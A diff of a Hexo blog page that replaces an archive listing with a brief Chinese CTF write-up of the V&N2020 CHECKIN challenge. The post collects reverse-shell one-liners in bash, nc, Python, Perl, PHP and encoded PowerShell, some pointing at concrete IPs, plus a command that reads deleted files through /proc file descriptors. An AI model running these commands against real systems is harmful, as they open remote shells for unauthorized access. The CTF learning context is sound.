@@ -16,7 +16,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>Archives ~ Hexo</title>
+  <title>[V&amp;N2020 公开赛]CHECKIN ~ Hexo</title>
 
   <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
 <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
@@ -40,7 +40,7 @@
 
 
 <body>
-  <header style="height: 80vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -114,6 +114,41 @@
             </span>
 
             
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  Saturday, May 2nd 2020, 7:12 pm
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    445 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      2 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
           </div>
 
           
@@ -124,77 +159,71 @@
 
   <main>
     
-      <div class="container nopadding-md">
-        <div class="py-5 z-depth-3" id="board">
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-<div class="list-group">
-  <p class="h4">49 posts in total.</p>
-  <hr>
-  
-    
       
-      <p class="h5">2020</p>
-    
-    <a href="/2020/02/27/php-intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cis-numeric-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">php intval()函数漏洞，is_numeric() 漏洞，绕过回文判断</span>
-      <span style="float: right;">02-27</span>
-    </a>
-  
-    
-    <a href="/2020/02/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">攻防世界pwn1</span>
-      <span style="float: right;">02-15</span>
-    </a>
-  
-    
-    <a href="/2020/02/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cstack2/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">攻防世界stack2</span>
-      <span style="float: right;">02-11</span>
-    </a>
-  
-    
-    <a href="/2020/02/10/CG-CTF-Stack-Overflow/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">CG-CTF Stack Overflow</span>
-      <span style="float: right;">02-10</span>
-    </a>
-  
-    
-    <a href="/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cforgot/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">攻防世界forgot</span>
-      <span style="float: right;">02-08</span>
-    </a>
-  
-    
-    <a href="/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMary-Morton/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">攻防世界Mary_Morton</span>
-      <span style="float: right;">02-08</span>
-    </a>
-  
-    
-    <a href="/2020/02/03/XCTF-int-overflow/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">XCTF int_overflow</span>
-      <span style="float: right;">02-03</span>
-    </a>
-  
-    
-    <a href="/2020/02/01/jarvisoj-pwn-smashes/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">jarvisoj pwn smashes</span>
-      <span style="float: right;">02-01</span>
-    </a>
-  
-</div>
 
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h2 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h2><p>看到这题的时候并不会做。考点是反弹shell。</p>
+<p>收集一点可能用上的反弹shell命令</p>
+<p><strong><em>1\</em></strong>|<strong><em>0**</em></strong>bash**</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre><p><strong><em>2\</em></strong>|<strong><em>0**</em></strong>nc**</p>
+<pre><code>nc -e /bin/sh ip port</code></pre><p><strong><em>3\</em></strong>|<strong><em>0**</em></strong>python**</p>
+<pre><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></pre><p><strong><em>4\</em></strong>|<strong><em>0**</em></strong>perl**</p>
+<pre><code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;ip:port&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;
+perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;174.0.224.117:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><p><strong><em>5\</em></strong>|<strong><em>0**</em></strong>php**</p>
+<pre><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p><strong><em>6\</em></strong>|<strong><em>0**</em></strong>PowerShell**</p>
+<pre><code>[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(&#39;$c=New-Object Net.Sockets.TCPClient(&quot;174.1.52.162&quot;,6666);$s=$c.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$s.Read($bytes, 0, $bytes.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $d 2&gt;&amp;1 | Out-String );$sb2=$sb+&#39;&#39;PS &#39;&#39;+(pwd).Path+&#39;&#39;&gt; &#39;&#39;;$sb=([Text.Encoding]::Default).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()&#39;))
 
-              </div>
-            </div>
+powershell -nop -enc {reverse shell command}</code></pre><p>参考：<a href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html" target="_blank" rel="noopener">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p>
+<p>连入后因为：</p>
+<p>当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。</p>
+<p>执行</p>
+<p><code>python3 -c &quot;import os;[os.system(&#39;cat /proc/&#39;+str(i)+&#39;/fd/&#39;+str(j)) for i in range(20) for j in range(10)];&quot;</code></p>
+
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+            </p>
+            
           </div>
         </div>
       </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+
+    
+  </div>
+</div>
+
     
   </main>
 
@@ -269,6 +298,11 @@
 
 
 
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
 
 
   <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
@@ -309,7 +343,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Archive&nbsp;",
+        "[V&N2020 公开赛]CHECKIN&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
